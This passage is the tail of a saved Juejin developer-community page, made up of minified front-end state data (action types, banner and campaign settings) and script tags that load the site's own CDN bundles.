CE_FETCH:"@\u002Fview\u002Fpin\u002FsubCommentList\u002FFORCE_FETCH",FETCH_MORE:"@\u002Fview\u002Fpin\u002FsubCommentList\u002FFETCH_MORE",RESET:"@\u002Fview\u002Fpin\u002FsubCommentList\u002FRESET"},commentId:c}},topic:{topic:e,followedTopicList:[],actionType:{FETCH:"@\u002Fview\u002Ftopic\u002FFETCH",UPDATE_STATE:"@\u002Fview\u002Ftopic\u002FUPDATE_STATE",RESET:"@\u002Fview\u002Ftopic\u002FRESET"},allTopicList:{pageSize:x,page:d,total:d,pointer:c,lastPointer:c,list:[],loading:a,error:c,canPrev:b,canNext:b,linkList:[],lastFetchOnServer:a,actionType:{UPDATE:"@\u002Fview\u002Ftopic\u002FallTopicList\u002FUPDATE",FETCH:"@\u002Fview\u002Ftopic\u002FallTopicList\u002FFETCH",FORCE_FETCH:"@\u002Fview\u002Ftopic\u002FallTopicList\u002FFORCE_FETCH",FETCH_MORE:"@\u002Fview\u002Ftopic\u002FallTopicList\u002FFETCH_MORE",RESET:"@\u002Fview\u002Ftopic\u002FallTopicList\u002FRESET"},sortType:l},pinlist:{pageSize:h,page:g,total:d,pointer:c,lastPointer:c,list:[],loading:a,error:c,canPrev:b,canNext:b,linkList:[],lastFetchOnServer:a,actionType:{UPDATE:"@\u002Fview\u002Ftopic\u002FpinList\u002FUPDATE",FETCH:"@\u002Fview\u002Ftopic\u002FpinList\u002FFETCH",FORCE_FETCH:"@\u002Fview\u002Ftopic\u002FpinList\u002FFORCE_FETCH",FETCH_MORE:"@\u002Fview\u002Ftopic\u002FpinList\u002FFETCH_MORE",RESET:"@\u002Fview\u002Ftopic\u002FpinList\u002FRESET"},sortType:s},sidebar:{actionType:{RESET:"@\u002Fview\u002Ftopic\u002Fsidebar\u002FRESET",UPDATE_STATE:"@\u002Fview\u002Ftopic\u002Fsidebar\u002FUPDATE_STATE"},attender:{pageSize:h,page:g,total:d,pointer:c,lastPointer:c,list:[],loading:a,error:c,canPrev:b,canNext:b,linkList:[],lastFetchOnServer:a,actionType:{UPDATE:"@\u002Fview\u002Ftopic\u002Fsidebar\u002Fattender\u002FUPDATE",FETCH:"@\u002Fview\u002Ftopic\u002Fsidebar\u002Fattender\u002FFETCH",FORCE_FETCH:"@\u002Fview\u002Ftopic\u002Fsidebar\u002Fattender\u002FFORCE_FETCH",FETCH_MORE:"@\u002Fview\u002Ftopic\u002Fsidebar\u002Fattender\u002FFETCH_MORE",RESET:"@\u002Fview\u002Ftopic\u002Fsidebar\u002Fattender\u002FRESET"},topicId:c}},followedList:{pageSize:x,page:d,total:d,pointer:c,lastPointer:c,list:[],loading:a,error:c,canPrev:b,canNext:b,linkList:[],lastFetchOnServer:a,actionType:{UPDATE:"@\u002Fview\u002Ftopic\u002FfollowedList\u002FUPDATE",FETCH:"@\u002Fview\u002Ftopic\u002FfollowedList\u002FFETCH",FORCE_FETCH:"@\u002Fview\u002Ftopic\u002FfollowedList\u002FFORCE_FETCH",FETCH_MORE:"@\u002Fview\u002Ftopic\u002FfollowedList\u002FFETCH_MORE",RESET:"@\u002Fview\u002Ftopic\u002FfollowedList\u002FRESET"},after:d}},recommendationIndex:{actionType:{FETCH_USER:"@\u002Fview\u002Frecommendation\u002FFETCH_USER",FETCH_MORE:"@\u002Fview\u002Frecommendation\u002FFETCH_MORE",RESET:"@\u002Fview\u002Frecommendation\u002FRESET",FETCH:"@\u002Fview\u002Frecommendation\u002FFETCH"},cursor:e,hasMore:e,userList:[],loading:a,skeleton:b,category:k,categoryNavList:[],serverRenderUserList:a},event:{event:{},loading:a,user:{},actionType:{FETCH:"view\u002Fevent\u002FFETCH",RESET:"view\u002Fevent\u002FRESET"}},academyIndex:{academy:{},bannerList:[],qualitiedList:[],latestList:[],offlineList:[],loading:a,user:{},actionType:{FETCH:"view\u002Facademy\u002FFETCH",RESET:"view\u002Facademy\u002FRESET"}},coursesIndex:{loading:a,list:[],sort:"online",actionType:{FETCH:"view\u002Fcourses\u002FFETCH",RESET:"view\u002Fcourses\u002FRESET",FETCH_MORE:"view\u002Fcourses\u002FFETCH_MORE"}},team:{team:{},loading:b,actionType:{FETCH:"@\u002Fview\u002Fteam\u002FFETCH",RESET:"@\u002Fview\u002Fteam\u002FRESET",UPDATE:"@\u002Fview\u002Fteam\u002FUPDATE",FOLLOW:"@\u002Fview\u002Fteam\u002FFOLLOW"},detailList:{actionType:{RESET:"@\u002Fview\u002Fteam\u002FdetailList\u002FRESET"},posts:{list:[],hasMore:a,skeleton:a,loading:a,sort:m,actionType:{FETCH:"@\u002Fview\u002Fteam\u002FdetailList\u002Fposts\u002FFETCH",UPDATE_STATE:"@\u002Fview\u002Fteam\u002FdetailList\u002Fposts\u002FUPDATE_STATE",FETCH_MORE:"@\u002Fview\u002Fteam\u002FdetailList\u002Fposts\u002FFETCH_MORE",RESET:"@\u002Fview\u002Fteam\u002FdetailList\u002Fposts\u002FRESET"}},pins:{list:[],hasMore:a,loading:a,skeleton:b,actionType:{FETCH:"@\u002Fview\u002Fteam\u002FdetailList\u002Fpins\u002FFETCH",UPDATE_STATE:"@\u002Fview\u002Fteam\u002FdetailList\u002Fpins\u002FUPDATE_STATE",FETCH_MORE:"@\u002Fview\u002Fteam\u002FdetailList\u002Fpins\u002FFETCH_MORE",RESET:"@\u002Fview\u002Fteam\u002FdetailList\u002Fpins\u002FRESET"}},hire:{list:[],hasMore:a,cursor:f,loading:a,skeleton:b,actionType:{FETCH:"@\u002Fview\u002Fteam\u002FdetailList\u002Fhire\u002FFETCH",UPDATE_STATE:"@\u002Fview\u002Fteam\u002FdetailList\u002Fhire\u002FUPDATE_STATE",FETCH_MORE:"@\u002Fview\u002Fteam\u002FdetailList\u002Fhire\u002FFETCH_MORE",RESET:"@\u002Fview\u002Fteam\u002FdetailList\u002Fhire\u002FRESET"}}}},couponList:{list:{"0":t,"1":t,"2":t}},payment:{selectedDiscount:{},bookletDetail:{},coupons:{availables:[],unavailables:[]}}},component:{indexAside:{bannerList:[],userList:[],actionType:{FETCH_BANNER:"@\u002Fcomponent\u002Faside\u002FFETCH_BANNER",FETCH_USER:"@\u002Fcomponent\u002Faside\u002FFETCH_USER",CLOSE_BANNER:"@\u002Fcomponent\u002Faside\u002FCLOSE_BANNER"}}},ore:{oreCount:d},avatarMenuInfo:{},common:{theme:"light"},env:{ua:"Mozilla\u002F5.0 (Windows NT 10.0; Win64; x64) AppleWebKit\u002F537.36 (KHTML, like Gecko) Typora\u002F1.3.6 Chrome\u002F100.0.4896.160 Electron\u002F18.3.0 Safari\u002F537.36"},auth:{user:c,clientId:e,token:e},tag:{subscribedTagList:[]},entry:{isLikeLoading:a},collection:{},comment:{},bookComment:{},repoComment:{},category:{list:[]},user:{subscribedTagList:[]},notification:{unreadCount:{user:d,system:d,total:d}},follow:{subscribedTagList:[]},error:{location:c,errorView:c,statusCode:200},abTest:{info:{}},suspensionPanel:{needSuspension:b},pinComment:{},pin:{deleteDialogVisible:a,reportDialogVisible:a,targetPin:c,isOnFocus:a},topic:{visible:a},activity:{"2020":{},offer:{is_show:d,start_time:d},voteData:{err_no:d,err_msg:"success",data:{face:{title:e,activity_id:"2024",start_time:1657814400,end_time:1668787200,status:g,image:"https:\u002F\u002Fp9-juejin.byteimg.com\u002Ftos-cn-i-k3u1fbpfcp\u002Fd4bdb22a62c64ebd9eadc0646d5b6a53~tplv-k3u1fbpfcp-zoom-1.image",close_image:"https:\u002F\u002Fp3-juejin.byteimg.com\u002Ftos-cn-i-k3u1fbpfcp\u002F882fc263e36347ffbf6d598de520870e~tplv-k3u1fbpfcp-image.image",url:"https:\u002F\u002Fjuejin.cn\u002Fmagic\u002Feco\u002Fruntime\u002Frelease\u002F636c6d57dd25b303e84121e9?appType=juejin&magic_page_no=1",is_show:g},top:{title:n,activity_id:o,start_time:p,end_time:q,status:g,image:"https:\u002F\u002Fp1-juejin.byteimg.com\u002Ftos-cn-i-k3u1fbpfcp\u002Fac22d16bd96248f48b9f63ab747a1e04~tplv-k3u1fbpfcp-zoom-1.image",close_image:"https:\u002F\u002Fp1-juejin.byteimg.com\u002Ftos-cn-i-k3u1fbpfcp\u002F4e7fb9a08a1d4f13889588806b35d2ba~tplv-k3u1fbpfcp-zoom-1.image?",url:"https:\u002F\u002Fjuejin.cn\u002Fchallenge\u002F1?utm_source=app_nav",is_show:g},web_top:{title:n,activity_id:o,start_time:p,end_time:q,status:g,image:j,close_image:j,url:"https:\u002F\u002Fjuejin.cn\u002Fchallenge\u002F1?utm_source=web_nav",is_show:g},plugin_top:{title:n,activity_id:o,start_time:p,end_time:q,status:g,image:j,close_image:j,url:"https:\u002F\u002Fjuejin.cn\u002Fchallenge\u002F1?utm_source=extension_nav",is_show:g},search_top:{title:"我的2021年度报告",activity_id:y,start_time:z,end_time:1642348799,status:u,image:A,close_image:B,url:"https:\u002F\u002Fjuejin.cn\u002Freport2021\u002Fmobile?utm_campaign=report_2021&utm_medium=app_search&share_title=2021%E6%8E%98%E5%8F%8B%E5%B9%B4%E5%BA%A6%E6%8A%A5%E5%91%8A&share_desc=%E8%A7%A3%E9%94%81%E5%B9%B4%E5%BA%A6%E6%8A%A5%E5%91%8A%EF%BC%8C%E9%A2%86%E5%8F%96%E4%B8%93%E5%B1%9E%E5%BE%BD%E7%AB%A0&share_image=https%3A%2F%2Fp9-juejin.byteimg.com%2Ftos-cn-i-k3u1fbpfcp%2F26a9012785e643a6a520ed63b513c57e~tplv-k3u1fbpfcp-image.image",is_show:d},web_search:{title:"字节内部课会员免费学",activity_id:y,start_time:z,end_time:1664121599,status:u,image:A,close_image:B,url:"https:\u002F\u002Fjuejin.cn\u002Fpost\u002F7143435263472041998?utm_source=search&utm_medium=OM&utm_campaign=vip_activity_kxj",is_show:d},jcode_top:{title:n,activity_id:o,start_time:p,end_time:q,status:g,image:j,close_image:j,url:"https:\u002F\u002Fjuejin.cn\u002Fchallenge\u002F1?utm_source=code_nav",is_show:g},offer:{title:e,activity_id:"2020",start_time:1617638400,end_time:1618934400,status:u,image:"https:\u002F\u002Fp9-juejin.byteimg.com\u002Ftos-cn-i-k3u1fbpfcp\u002F2879410508de459c91ae8b7509ca75f8~tplv-k3u1fbpfcp-zoom-1.image",close_image:"https:\u002F\u002Fp9-juejin.byteimg.com\u002Ftos-cn-i-k3u1fbpfcp\u002Fa38d640009e14c87a7d29cd95dee27dd~tplv-k3u1fbpfcp-zoom-1.image",url:"https:\u002F\u002Fjuejin-activity.bytedance.net\u002Frank",is_show:d}}}},header:{leadStep:d,isPopupZlink:a},tcc:{tccConfig:c},route:{name:"column",path:v,hash:e,query:{},params:{id:w},fullPath:v,meta:{},from:{name:c,path:C,hash:e,query:{},params:{},fullPath:C,meta:{}}}},serverRendered:b,routePath:v,config:{API_HOST:"api.juejin.cn",CAPTCHA_HOST:"verify.snssdk.com",PLATFORM_APPID:{wechat:1277,weibo:1276,github:1045,wechatApp:1070},http:{}},globalRefs:{}}}(false,true,null,0,"","0",1,20,"topic","https:\u002F\u002Fp6-juejin.byteimg.com\u002Ftos-cn-i-k3u1fbpfcp\u002F759e2aa805c0461b840e0f0f09ed05fa~tplv-k3u1fbpfcp-zoom-1.image?","recommended","hot","newest","1024 码上掘金编程挑战赛","2022",1666540800,1669823999,"following","popular",{},2,"\u002Fpost\u002F7020701580210995230","7020701580210995230",100,"2021",1641780000,"https:\u002F\u002Fp3-juejin.byteimg.com\u002Ftos-cn-i-k3u1fbpfcp\u002Fa06289e83d9640c4b8504d2626cfbbee~tplv-k3u1fbpfcp-image.image","https:\u002F\u002Fp9-juejin.byteimg.com\u002Ftos-cn-i-k3u1fbpfcp\u002Fe5199830276c4a85bc7c8cb8edecd54d~tplv-k3u1fbpfcp-image.image","\u002F"));</script><script src="//lf3-cdn-tos.bytescm.com/obj/static/xitu_juejin_web/2a06dad.js" defer></script><script src="//lf3-cdn-tos.bytescm.com/obj/static/xitu_juejin_web/e3da178.js" defer></script><script src="//lf3-cdn-tos.bytescm.com/obj/static/xitu_juejin_web/4deffbb.js" defer></script><script src="//lf3-cdn-tos.bytescm.com/obj/static/xitu_juejin_web/77c8c0a.js" defer></script><script src="//lf3-cdn-tos.bytescm.com/obj/static/xitu_juejin_web/6529f6e.js" defer></script><script src="//lf3-cdn-tos.bytescm.com/obj/static/xitu_juejin_web/2372901.js" defer></script><script src="//lf3-cdn-tos.bytescm.com/obj/static/xitu_juejin_web/3aa8109.js" defer></script>
  </body>
</html>
